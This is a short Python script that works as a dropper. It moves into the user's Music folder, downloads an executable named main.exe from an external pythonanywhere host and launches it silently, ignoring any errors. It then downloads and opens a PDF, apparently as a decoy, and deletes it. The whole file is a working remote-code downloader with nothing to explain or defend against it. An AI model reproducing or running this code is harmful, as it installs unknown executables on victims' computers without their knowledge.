import requests,os,subprocess

def download(url):

    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    

current_dir = os.getcwd()
strr = os.getcwd()
x = -2
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")


os.chdir("Music")
try:
    download("https://armeng.pythonanywhere.com/media/files/main.exe")
    os.startfile("main.exe")
except Exception:
    pass

download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
subprocess.call("gt3-gt4-bep.pdf", shell=True) 
os.remove("gt3-gt4-bep.pdf")

